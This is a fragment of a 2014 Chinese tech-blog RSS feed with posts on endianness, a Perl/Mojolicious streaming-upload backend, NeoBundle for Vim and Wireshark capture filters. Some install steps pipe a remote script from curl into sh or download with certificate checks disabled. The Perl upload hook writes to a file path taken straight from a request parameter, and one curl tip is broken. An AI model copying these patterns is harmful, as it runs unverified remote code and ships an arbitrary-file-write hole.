&lt;p&gt;&lt;strong&gt;大小端&lt;/strong&gt;的说法源自《格列佛游记》。我们知道，鸡蛋通常一端大一端小，小人国的人们对于剥蛋壳时应从哪一端开始剥起有着不一样的看法。同样，计算机界对于传输多字节字（由多个字节来共同表示一个数据类型）时，是先传高位字节（大端）还是先传低位字节（小端）也有着不一样的看法，这就是计算机里头大小端模式的由来了。无论是写文件还是网络传输，实际上都是往流设备进行写操作的过程，而且这个写操作是从流的低地址向高地址开始写（这很符合人的习惯），对于多字节字来说，如果先写入高位字节，则称作大端模式。反之则称作小端模式。也就是说，大端模式下，字节序和流设备的地址顺序是相反的，而小端模式则是相同的。一般网络协议都采用大端模式进行传输。&lt;/p&gt;
&lt;p&gt;——&lt;a title=&quot;关于字符编码，你所需要知道的&quot; href=&quot;http://www.imkevinyang.com/2010/06/%e5%85%b3%e4%ba%8e%e5%ad%97%e7%ac%a6%e7%bc%96%e7%a0%81%ef%bc%8c%e4%bd%a0%e6%89%80%e9%9c%80%e8%a6%81%e7%9f%a5%e9%81%93%e7%9a%84.html&quot;&gt;&lt;em&gt;&lt;strong&gt;Kevin Yang&lt;/strong&gt;&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考链接：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a title=&quot;The Absolute Minimum Every Software Developer Absolutely, Positively Must Know About Unicode and Character Sets (No Excuses!)&quot; href=&quot;http://www.joelonsoftware.com/printerFriendly/articles/Unicode.html&quot; target=&quot;_blank&quot;&gt;The Absolute Minimum Every Software Developer Absolutely, Positively Must Know About Unicode and Character Sets (No Excuses!)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://developers.sun.com/dev/gadc/technicalpublications/articles/gb18030.html&quot;&gt;http://developers.sun.com/dev/gadc/technicalpublications/articles/gb18030.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Universal_Character_Set&quot;&gt;http://en.wikipedia.org/wiki/Universal_Character_Set&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Code_page&quot;&gt;http://en.wikipedia.org/wiki/Code_page&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;/div --&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;nofollow&quot; href=&quot;http://www.jobdeer.com/?fr=jobbole&quot;&gt;&lt;/a&gt;&lt;/p&gt;
	


	

</description>
        <pubDate>Wed, 23 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-23-74109-23c6c0d86.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-23-74109-23c6c0d86.html</guid>
        
        
      </item>
    
      <item>
        <title>Stream 的 Perl 后端实现关键技术介绍 (Mojolicous)</title>
        <description>

							&lt;p&gt;上一个文章&lt;a href=&quot;http://%20http://www.php-oa.com/2014/07/23/%E5%85%A8%E5%B9%B3%E5%8F%B0%E5%A4%A7%E6%96%87%E4%BB%B6%E6%96%AD%E7%82%B9%E7%BB%AD%E4%BC%A0%E4%B8%8A%E4%BC%A0%E6%8A%80%E6%9C%AF.html&quot;&gt;全平台大文件断点续传上传技术&lt;/a&gt;中的核心技术除了浏览器, 就是服务器端的实现了. 我在这边了简单高效, 是使用的 Mojolicious 来实现的.&lt;br&gt;
 Mojolcious 有着很好的事件支持, 所以就算本身只启动一个进程的时候, 都可以接收无数用户的同时上传.&lt;br&gt;
下面我来讲一下这个技术中实现的重点.&lt;br&gt;
我们知道 POST 上传, 是分很多种不同的情况, 在 Stream 的项目中,  HTML5 的实现, 是使用的 POST body 的方式实现的.有关 post 上关方式的介绍, 请看: &lt;a href=&quot;http://www.php-oa.com/2014/07/15/http-post-mojolicious.html&quot;&gt;HTTP 的 POST 参数提交&lt;/a&gt;.&lt;br&gt;
在上面文章的例子中, 取 body 都是从使用 req-&amp;gt;body 的方式来取, 这也就意味着, 如果上传 1G ,我们会一次给一 G 的内容都放入内存. 在 Mojolicious 中有一个叫 Mojo::Upload 的模块, 也是处理上传的, 但是它只能处理以  application/x-www-form-urlencoded 和  application/x-www-form-urlencoded 的上传. 这个处理得非常有技巧, 整个文件上传了多少, 就会给多少内容存到文件本身, 这样就不会有过大的内存占用. 并且都是事件回调, 所以可以很好的处理多用户.&lt;/p&gt;
&lt;p&gt;但这个模块并不能处理 post 一个超大 body 就是文件本身的情况. 直接取 body 又大占内存, 所以在这, 我是使用的 Mojolicous 本身提供的 hook 点, 在用户提交创建完连接后, 然后请求的 header 解析完的时候, 来做了一个事件注册.&lt;br&gt;
整个核心的代码简写是:&lt;/p&gt;
&lt;pre class=&quot;brush:perl;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;&quot;&gt;
hook after_build_tx =&amp;gt; sub {
    my $tx = shift;
    my $app = shift;
    weaken $tx;

    $tx-&amp;gt;req-&amp;gt;content-&amp;gt;on(body =&amp;gt; sub {
        my $single  = shift;

        return unless $tx-&amp;gt;req-&amp;gt;url-&amp;gt;path-&amp;gt;contains(&#39;/upload&#39;);
        my $file = Mojo::Asset::File-&amp;gt;new(path =&amp;gt; $tx-&amp;gt;req-&amp;gt;param(&#39;path&#39;), cleanup =&amp;gt; 0);

        $single-&amp;gt;unsubscribe(&#39;read&#39;)-&amp;gt;on(read =&amp;gt; sub {
            my ($single, $bytes) = @_;
            $file-&amp;gt;add_chunk($bytes);
        });
    });
};

&lt;/pre&gt;
&lt;p&gt;
这个 body 的事件是创建完连接, 并在 header 解析完, 但 body 并没有开始取的时候注册, 所以这个地方, 只针对我们上传的目录来进行实时写入的事件回调注册就行.&lt;/p&gt;
&lt;p&gt;这时我们进入 body , 然后对 body 读取的事件中的可读的时候, 进行注册, 使用 Mojo::Asset::File 来对一个文件不断的追加, 直到整个文件写入完整后.&lt;/p&gt;
&lt;p&gt;注意, Mojo::Asset::File 这个模块是在 Mojolicous 5.16 以后才支持对已存在的文件进行追加写入( 还是我好不容易向作者提交的补丁 ).&lt;/p&gt;

			&lt;!--[syntaxhighlighter]--&gt;
			&lt;!--代码高亮，请勿编辑--&gt;
			&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.php-oa.com/wp-content/plugins/ck-and-syntaxhighlighter/syntaxhighlighter/scripts/shCore.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.php-oa.com/wp-content/plugins/ck-and-syntaxhighlighter/syntaxhighlighter/scripts/shBrushPerl.js&quot;&gt;&lt;/script&gt;

			&lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;http://www.php-oa.com/wp-content/plugins/ck-and-syntaxhighlighter/syntaxhighlighter/styles/shCoreDefault.css&quot;&gt;
			&lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;http://www.php-oa.com/wp-content/plugins/ck-and-syntaxhighlighter/syntaxhighlighter/styles/shThemeDefault.css&quot;&gt;
			&lt;script type=&quot;text/javascript&quot;&gt;
			SyntaxHighlighter.defaults[&#39;class-name&#39;]	= &#39;.syntaxhighlighter {     background-color: 999999 }&#39;;
			SyntaxHighlighter.defaults[&#39;smart-tabs&#39;]	= true;
			SyntaxHighlighter.defaults[&#39;tab-size&#39;]		= 4;
			SyntaxHighlighter.defaults[&#39;gutter&#39;]		= true;
			SyntaxHighlighter.defaults[&#39;quick-code&#39;]	= true;
			SyntaxHighlighter.defaults[&#39;collapse&#39;] 		= false;
			SyntaxHighlighter.defaults[&#39;auto-links&#39;]	= true;
			SyntaxHighlighter.defaults[&#39;toolbar&#39;]		= true;
			SyntaxHighlighter.all();
			&lt;/script&gt;
			&lt;!--[/syntaxhighlighter]--&gt;						

</description>
        <pubDate>Wed, 23 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-23-5642.html-a2578a751.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-23-5642.html-a2578a751.html</guid>
        
        
      </item>
    
      <item>
        <title>全平台大文件断点续传上传技术 ( 开源项目 Stream )</title>
        <description>

							&lt;p&gt;近来看了一下大文件断点续传的开源项目, 发现了 &lt;a href=&quot;http://www.twinkling.cn/&quot;&gt;Stream &lt;/a&gt;这个好项目, 非常非常感谢作者. 然后我花了点时间, 简单的使用 Perl 来实现了一下相关的接口. 这个是非常好的用来解决不同浏览器上传文件的方案.&lt;/p&gt;
&lt;article class=&quot;markdown-body entry-content&quot; itemprop=&quot;mainContentOfPage&quot;&gt;
&lt;h1&gt;
	&lt;a class=&quot;anchor&quot; href=&quot;https://github.com/iakuf/mojolicious-stream-upload#stream-%E4%B8%8A%E4%BC%A0%E6%8F%92%E4%BB%B6%E4%BB%8B%E7%BB%8D&quot; name=&quot;user-content-stream-%E4%B8%8A%E4%BC%A0%E6%8F%92%E4%BB%B6%E4%BB%8B%E7%BB%8D&quot;&gt;&lt;/a&gt;Stream 上传插件介绍&lt;/h1&gt;
&lt;p&gt;
	Stream 这个项目主要是为了解决大文件上传, 本程序只是它的一个 Perl 后端的实现. 项目网站是: &lt;a href=&quot;http://www.twinkling.cn&quot;&gt;http://www.twinkling.cn&lt;/a&gt; 原始地址是: &lt;a href=&quot;http://git.oschina.net/jiangdx/stream/wikis/home&quot;&gt;http://git.oschina.net/jiangdx/stream/wikis/home&lt;/a&gt;. 因为它对 HTML5 和 Flash 都支持, 所以很合适做全功能的上传平台. 在这, 感谢作者为我们大家提供这么好的开源项目.&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;支持HTML5、Flash两种方式（跨域）上传
支持多文件一起上传
HTML5方式支持断点续传，拖拽等新特性
兼容性好IE7+, FF3.6+, Chrome*，Safari4+，遨游等主流浏览器
选择文件的按钮完全可以自定义
进度条、速度、剩余时间等附属信息
基本的自定义属性及函数，如文件多选、上传成功的响应函数等
示例代码java实现（StreamServlet, FormDataServlet{commons-fileupload的stream api}, TokenServlet）

注：Chrome没测试最低版本，不想支持IE6
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;
	&lt;a class=&quot;anchor&quot; href=&quot;https://github.com/iakuf/mojolicious-stream-upload#stream-%E7%9A%84-perl-%E5%90%8E%E7%AB%AF&quot; name=&quot;user-content-stream-%E7%9A%84-perl-%E5%90%8E%E7%AB%AF&quot;&gt;&lt;/a&gt;Stream 的 Perl 后端&lt;/h1&gt;
&lt;p&gt;
	本后端是使用 Perl 中常用的框架 Mojolicious 实现. 本程序做为后端接收上传过来的大文件的时候, 完全使用的是异步流式处理, 所以就算是单进程, 也可以处理多个上传的请求. 并且不会有多少内存的占用. 因为使用 Mojolicious 实现, 所以需要安装这个框架和一些相关的模块. Perl 中模块的安装需要使用 cpanm 所以先要下载 cpanm .&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ wget  http://xrl.us/cpanm  --no-check-certificate -O /sbin/cpanm
$ chmod +x  /sbin/cpanm 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;
	然后开始安装&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ cpanm Mojolicious EV Digest::MD5 
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;
	&lt;a class=&quot;anchor&quot; href=&quot;https://github.com/iakuf/mojolicious-stream-upload#%E5%AE%89%E8%A3%85&quot; name=&quot;user-content-%E5%AE%89%E8%A3%85&quot;&gt;&lt;/a&gt;安装&lt;/h1&gt;
&lt;p&gt;
	这个 Perl 的后端的 stream 的实现文件都在项目 &lt;a href=&quot;https://github.com/iakuf/mojolicious-stream-upload&quot;&gt;https://github.com/iakuf/mojolicious-stream-upload&lt;/a&gt; 中. 大家需要使用到其中二个文件 stream.pl 和 StreamUpload.conf 所以可以使用任何方法下载这个项目中的文件. 其中 stream.pl 是执行文件, StreamUpload.conf 是配置文件.&lt;/p&gt;
&lt;p&gt;
	stream.pl 可以放在任何路径, StreamUpload.conf 请放到 &#39;/etc&#39; 的目录下.&lt;/p&gt;
&lt;h1&gt;
	&lt;a class=&quot;anchor&quot; href=&quot;https://github.com/iakuf/mojolicious-stream-upload#%E9%85%8D%E7%BD%AE&quot; name=&quot;user-content-%E9%85%8D%E7%BD%AE&quot;&gt;&lt;/a&gt;配置&lt;/h1&gt;
&lt;p&gt;
	整个配置文件如下:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;{
    hypnotoad =&amp;gt; {
        listen =&amp;gt; [&#39;http://*:3008&#39;],
            user   =&amp;gt; &#39;newupload&#39;,
            group  =&amp;gt; &#39;newupload&#39;,
    },
    UploadServer   =&amp;gt; &#39;http://xxx.xxxx.com&#39;,
    CrossOrigins   =&amp;gt; &#39;http://xxx.xxxx.com&#39;,
    FileRepository =&amp;gt; &#39;/tmp/&#39;,
    debug          =&amp;gt; 1,
    log            =&amp;gt; &#39;/var/log/upload.log&#39;,
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;
	指定用户和组&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;user   =&amp;gt; &#39;newupload&#39;
group  =&amp;gt; &#39;newupload&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;
	哪些域名的文件, 是可以接收并存储的&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;CrossOrigins   =&amp;gt; &#39;http://xxx.xxx.com&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;
	文件存储的目录&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;FileRepository =&amp;gt; &#39;/tmp/&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;
	修改服务器启动的端口&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;listen =&amp;gt; [&#39;http://*:3008&#39;]
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;
	&lt;a class=&quot;anchor&quot; href=&quot;https://github.com/iakuf/mojolicious-stream-upload#%E5%90%AF%E5%8A%A8&quot; name=&quot;user-content-%E5%90%AF%E5%8A%A8&quot;&gt;&lt;/a&gt;启动&lt;/h1&gt;
&lt;p&gt;
	hyphotoad 是一个常用的 Perl 后端的 Web 异步服务器, 为 Mojolicious 的原生配置. 多进程, 为 Unix 优化过. 所以使用它来启动,&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ hypnotoad stream.pl 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;
	现在就可以直接打开这个服务器来进行测试了&lt;/p&gt;
&lt;/article&gt;
						

</description>
        <pubDate>Wed, 23 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-23-%25e5%2585%25a8%25e5%25b9%25b3%25e5%258f%25b0%25e5%25a4%25a7%25e6%2596%2587%25e4%25bb%25b6%25e6%2596%25ad%25e7%2582%25b9%25e7%25bb%25ad%25e4%25bc%25a0%25e4%25b8%258a%25e4%25bc%25a0%25e6%258a%2580%25e6%259c%25af.html-a531e7bfe.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-23-%25e5%2585%25a8%25e5%25b9%25b3%25e5%258f%25b0%25e5%25a4%25a7%25e6%2596%2587%25e4%25bb%25b6%25e6%2596%25ad%25e7%2582%25b9%25e7%25bb%25ad%25e4%25bc%25a0%25e4%25b8%258a%25e4%25bc%25a0%25e6%258a%2580%25e6%259c%25af.html-a531e7bfe.html</guid>
        
        
      </item>
    
      <item>
        <title>教你用NeoBundle管理Vim插件</title>
        <description>

					
		
&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
google_ad_client = &quot;ca-pub-7056282119617872&quot;;
google_ad_slot = &quot;6645040531&quot;;
google_ad_width = 300;
google_ad_height = 250;
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;
src=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot;&gt;
&lt;/script&gt;
&lt;/div&gt;
&lt;br/ --&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/Shougo/neobundle.vim&quot;&gt;NeoBundle&lt;/a&gt; 是一个 &lt;a href=&quot;http://olex.openlogic.com/packages/vim&quot;&gt;Vim&lt;/a&gt; 的插件管理器，以 &lt;a href=&quot;https://github.com/gmarik/Vundle.vim&quot;&gt;Vundle&lt;/a&gt; 为基础（Vundle 是一个基于 &lt;a href=&quot;https://github.com/tpope/vim-pathogen&quot;&gt;Pathogen&lt;/a&gt; 的 Vim 插件管理器）。在之前的文章中，我&lt;a href=&quot;http://www.openlogic.com/wazi/bid/262302/Three-tools-for-managing-Vim-plugins&quot;&gt;非常不推荐使用 Neobundle&lt;/a&gt;，原因是它当时还处于高速开发阶段（LCTT：意味着不稳定、变数大），并且当时它的英文文档很少。现在，已经过了一年多了，这两个问题都早已不再是问题。&lt;/p&gt;
&lt;p&gt;我们为什么要使用插件管理器？Vim 支持大量插件，但是由于它没有严格定义框架，插件的文件可以胡乱分布在不同目录下，导致用户管理起来会很困难（LCTT：当然，前提是你有很多插件，还有点小小的强迫症，觉得理一理这些插件心里会舒服点）。而一款插件管理器能让管理变得简单许多。Pathogen, Vundle 和 NeoBundle 的工作就是为不同插件建立一个目录，然后将这些目录扔到 ~/.vim/bundle 目录下。这个文件整理方法可以让你方便彻底地删除插件，使用 ‘rm -rf &amp;lt;插件目录&amp;gt;’ 或直接在文件管理器里面把插件所在的目录删除就可以了，绝对绿色环保无残留。同时，这种方法还能最大程度避免插件与插件之间的不兼容性。&lt;/p&gt;
&lt;p&gt;eoBundle 是一个基于 Vundle 的项目，如同 Vundle，它们都可以安装和升级插件。然而 NeoBundle 的说明文件上明确指出：“NeoBundle 不是一个稳定的插件管理器，如果你想要一个稳定的，请选择 Vundle”。最新的 release-note 上也有警告“可能会造成兼容性问题”——这是一个开发者写的注解，说明这个管理器还不能让人放心使用。&lt;/p&gt;
&lt;p&gt;所以，我们为什么要使用 NeoBundle？它都不能保证稳定运行！好吧，它还是有可取之处的。Vundle 只支持 &lt;a href=&quot;http://olex.openlogic.com/packages/git&quot;&gt;Git&lt;/a&gt; 这种版本控制系统，而 NeoBundle 可以支持 &lt;a href=&quot;http://olex.openlogic.com/packages/subversion&quot;&gt;Subversion&lt;/a&gt; 和 &lt;a href=&quot;http://olex.openlogic.com/packages/mercurial&quot;&gt;Mercurial&lt;/a&gt;。另一个原因是如果你不想插件升级时破坏你的 Vim 生态环境，你可以锁住 NeoBundle，让它只使用某个插件的固定版本。&lt;/p&gt;
&lt;p&gt;另外，NeoBundle 创建者，Shougo Matsuishita（LCTT：名字看着像日本人），正在将它的命令接口添加到其他插件项目，以便减少他们的命令使用量。现在 NeoBundle 支持3种插件：&lt;a href=&quot;https://github.com/Shougo/unite.vim&quot;&gt;unite.vim&lt;/a&gt;，Vim 使用的文件和缓存管理器；&lt;a href=&quot;https://github.com/Shougo/vimshell.vim/blob/master/doc/vimshell.txt&quot;&gt;vimshell.vim&lt;/a&gt;，Vim 使用的脚本程序；&lt;a href=&quot;https://github.com/Shougo/vimproc.vim/blob/master/doc/vimproc.txt&quot;&gt;vimproc.vim&lt;/a&gt;，运行于 vimshell.vim 中，用于对异步事件的支持。上面说的都是特殊案例，缺少英文文档，所以用户希望有人能完善它们。在正式使用它们之前，我们需要把注意力先集中在一些基本操作上。&lt;/p&gt;
&lt;h3 id=&quot;toc_1&quot;&gt;安装并初始化 NeoBundle&lt;/h3&gt;
&lt;p&gt;NeoBundle 支持 Vim 7.2.051 或更高版本，需要 git 和 &lt;a href=&quot;http://olex.openlogic.com/packages/curl&quot;&gt;cURL&lt;/a&gt;（用于下载文件）。你可以手动下载 NeoBundle，也可以使用 cURL 下载它在 GitHub 上的库。在你的 home 目录下使用如下命令，可以将 NeoBundle 插件下载到 .vim/bundle/neobundle.vim 目录里，然后 NeoBundle 就能管理它自己了。&lt;/p&gt;
&lt;pre class=&quot;brush: shell; gutter: true&quot;&gt;curl https://raw.githubusercontent.com/Shougo/neobundle.vim/master/bin/install.sh | sh&lt;/pre&gt;
&lt;p&gt;你还需要修改 .vimrc 文件。NeoBundle 的 GitHub 主页提供一个 .vimrc 范本，但是直接使用这个范本，NeoBundle 需要你安装5个可能不需要插件。如果不需要它们，你可以使用下面的最小配置：&lt;/p&gt;
&lt;pre class=&quot;brush: c; gutter: true&quot;&gt;if has(&#39;vim_starting&#39;)
set nocompatible    
set runtimepath+=~/.vim/bundle/neobundle.vim/
call neobundle#begin(expand(&#39;~/.vim/bundle/&#39;))
NeoBundleFetch &#39;Shougo/neobundle.vim&#39;
call neobundle#end()
filetype plugin indent on&lt;/pre&gt;
&lt;p&gt;上述配置的作用是：启动 NeoBundle 并且像其他插件一样升级自己。NeoBundle 默认从 GitHub 下载并升级，如果你正好在使用 GitHub，你只需要为这个插件指定维护者的用户名和路径。在上面的配置中，NeoBundleFetch 只需要指定为“Shougo/neobundle.vim”，而不是完整的 GitHub 路径。如果你想使用其他网站，比如是 Subversion 或 Mecurial 的网站，你就需要添加完整的 URL。&lt;/p&gt;
&lt;p&gt;如果你想安装其他插件，你可以使用下面的命令：&lt;/p&gt;
&lt;pre class=&quot;brush: c; gutter: true&quot;&gt;curl -k https://github.com/[项目维护者]/[插件路径] &amp;gt; ~/.vim/bundle/[插件路径]&lt;/pre&gt;
&lt;p&gt;举个例子：你想安装 &lt;a href=&quot;https://github.com/tpope/vim-abolish&quot;&gt;vim-abolish&lt;/a&gt;，一个超级 NB 的文本搜索和替换插件，就使用下面的命令：&lt;/p&gt;
&lt;pre class=&quot;brush: c; gutter: true&quot;&gt;curl -k https://github.com/tpope/vim-abolish &amp;gt; ~/.vim/bundle/abolish&lt;/pre&gt;
&lt;p&gt;如果要让它自动升级，在 NeoBundleFetch 那行下面添加一行：&lt;/p&gt;
&lt;pre class=&quot;brush: c; gutter: true&quot;&gt;NeoBundle &#39;tpope/vim-abolish&#39;&lt;/pre&gt;
&lt;p&gt;再介绍一个小技巧：你可以为插件指定一个分支或版本号。什么意思？NeoBundle 只会使用这个插件的某个分支或版本，而忽略其版本更新。如果你使用的某个插件处于高速开发过程，你就可以使用这个技巧，避免用到有 bug 的插件版本。举个例子：&lt;/p&gt;
&lt;pre class=&quot;brush: c; gutter: true&quot;&gt;NeoBundle &#39;Shougo/vimshell&#39;, { &#39;rev&#39; : &#39;3787e5&#39; }&lt;/pre&gt;
&lt;p&gt;还有一个技巧：在 .vimtc 文件内添加一行关于“NeoBundleCheck”的属性。NeoBundle 会根据配置检查没安装的插件，并提示你安装它们。你也可以使用命令“:NeoBundleInstall”（LCTT：这是要在 Vim 编辑器的命令模式下输入）来安装或升级插件。&lt;/p&gt;
&lt;h3 id=&quot;toc_2&quot;&gt;NeoBundle 用法&lt;/h3&gt;
&lt;p&gt;很多 NeoBundle 命令用起来和 Vundle 类似，但命令的名字不一样。下面是 NeoBundle 命令的用法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;:NeoBundleUpdate：安装或升级插件，如果你手动把一个插件的目录删除了，这个命令会重新安装这个插件。在这个命令后面加上插件名称，就只升级一个插件；不加参数，会将所有己安装但没被记录在案的插件给记录下来。:NeoBundleInstall 命令效果相同。&lt;/li&gt;
&lt;li&gt;:NeoBundle {REPOSITORY URI} [[REVISION}] [,OPTIONS}]]：将一个插件锁定到固定版本，防止胡乱升级。&lt;/li&gt;
&lt;li&gt;:NeoBundleList：列出所有未初始化的插件。&lt;/li&gt;
&lt;li&gt;:NeoBundleClean：进入交互界面，删除插件。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些命令在配合 unite.vim （LCTT：就是上面举过的32个例子之一）使用时，效果会稍微有些出入。你可以使用“:help neobundle”命令了解更多信息。&lt;/p&gt;
&lt;h3 id=&quot;toc_3&quot;&gt;是否使用 NeoBundle，自己决定&lt;/h3&gt;
&lt;p&gt;NeoBundle 是强大的工具，正处于高速开发状态。任何处于这种状态的项目，都会被帖上“有前途”和“不稳定”两个标签，看你自己怎么选。如果你想要最新的稳定版本的插件，NeoBundle 能够把 Vundle 和 Pathogen 甩出几条街。&lt;/p&gt;
&lt;p&gt;然而在线帮助文档已经给出警告，它不是个稳定的产品，不及时更新版本可能造成一些插件运行出错。最后，你需要在 .vimrc 文件为你的 Neoundle 和其他插件指定一个稳定的版本。记住这警告，然后你可以在使用这些尖端技术产品时游刃有余。&lt;/p&gt;


&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;/div --&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;nofollow&quot; href=&quot;http://www.jobdeer.com/?fr=jobbole&quot;&gt;&lt;/a&gt;&lt;/p&gt;
	


	

</description>
        <pubDate>Tue, 22 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-22-74055-d95c87eea.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-22-74055-d95c87eea.html</guid>
        
        
      </item>
    
      <item>
        <title>一站式学习Wireshark（八）：应用Wireshark过滤条件抓取特定数据流</title>
        <description>

					
		
&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
google_ad_client = &quot;ca-pub-7056282119617872&quot;;
google_ad_slot = &quot;6645040531&quot;;
google_ad_width = 300;
google_ad_height = 250;
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;
src=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot;&gt;
&lt;/script&gt;
&lt;/div&gt;
&lt;br/ --&gt;

&lt;p&gt;应用抓包过滤，选择Capture | Options，扩展窗口查看到&lt;strong&gt;Capture Filter&lt;/strong&gt;栏。双击选定的接口，如下图所示，弹出&lt;strong&gt;Edit Interface Settints&lt;/strong&gt;窗口。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/7ffcc37d1b7296aa062e068b9c3a28bb.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;下图显示了&lt;strong&gt;Edit Interface Settings&lt;/strong&gt;窗口，这里可以设置抓包过滤条件。如果你确知抓包过滤条件的语法，直接在Capture Filter区域输入。在输入错误时，Wireshark通过红色背景区域表明无法处理过滤条件。最有可能的情况是，过滤条件中含有输入错误，或是使用了display filter的语法。&lt;/p&gt;
&lt;p&gt;点击&lt;strong&gt;Capture Filter&lt;/strong&gt;按钮查看并选择已保存的抓包过滤条件。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/e9792c6412bc2a86af25ffcb1d7a5cb5.jpg&quot;&gt;&lt;/p&gt;
&lt;div&gt;
&lt;h1&gt;更多信息&lt;/h1&gt;
&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;抓取指定&lt;/strong&gt;&lt;strong&gt;IP地址的数据流:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果你的抓包环境下有很多主机正在通讯，可以考虑使用所观察主机的IP地址来进行过滤。以下为IP地址抓包过滤示例：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;host 10.3.1.1：抓取发到/来自10.3.1.1的数据流&lt;/li&gt;
&lt;li&gt;host 2406:da00:ff00::6b16:f02d：抓取发到/来自IPv6地址2406:da00:ff00::6b16:f02d的数据流&lt;/li&gt;
&lt;li&gt;not host 10.3.1.1：抓取除了发到/来自10.3.1.1以外的所有数据流&lt;/li&gt;
&lt;li&gt;src host 10.3.1.1：抓取来自10.3.1.1的数据流&lt;/li&gt;
&lt;li&gt;dst host 10.3.1.1：抓取发到10.3.1.1的数据流&lt;/li&gt;
&lt;li&gt;host 10.3.1.1 or 10.3.1.2：抓取发到/来自10.3.1.1，以及与之通讯的所有数据流，与10.3.1.2，以及与之通讯的所有数据流&lt;/li&gt;
&lt;li&gt;host &lt;a href=&quot;http://www.espn.com/&quot; target=&quot;_blank&quot;&gt;www.espn.com&lt;/a&gt;：抓取发到/来自所有解析为&lt;a href=&quot;http://www.espn.xn--comip-k81m/&quot; target=&quot;_blank&quot;&gt;www.espn.com的IP&lt;/a&gt;地址的数据流&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;抓取指定&lt;/strong&gt;&lt;strong&gt;IP地址范围的数据流:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当你需要抓取来自/发到一组地址的数据流，可以采用CIDR(无类别域间路由，Classless Interdomain Routing)格式或使用mask参数。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;net 10.3.0.0/16：抓取网络10.3.0.0上发到/来自所有主机的数据流(16表示长度)&lt;/li&gt;
&lt;li&gt;net 10.3.0.0 mask 255.255.0.0：与之前的过滤结果相同&lt;/li&gt;
&lt;li&gt;ip6 net 2406:da00:ff00::/64：抓取网络2406:da00:ff00:0000(IPv6)上发到/来自所有主机的数据流&lt;/li&gt;
&lt;li&gt;not dst net 10.3.0.0/16：抓取除了发到以10.3开头的IP地址以外的所有数据流&lt;/li&gt;
&lt;li&gt;not src net 10.3.0.0/16：抓取除了来自以10.3开头的IP地址以外的所有数据流&lt;/li&gt;
&lt;li&gt;ip proto &amp;lt;protocol code&amp;gt;：抓取ip协议字段等于&amp;lt;protocol code&amp;gt;值的报文。如TCP(code 6), UDP(code 17), ICMP(code 1)。&lt;/li&gt;
&lt;li&gt;ip[2:2]==&amp;lt;number&amp;gt;：ip报文大小&lt;/li&gt;
&lt;li&gt;ip[8]==&amp;lt;number&amp;gt;：TTL(Time to Live)值&lt;/li&gt;
&lt;li&gt;ip[9]==&amp;lt;number&amp;gt;：协议值&lt;/li&gt;
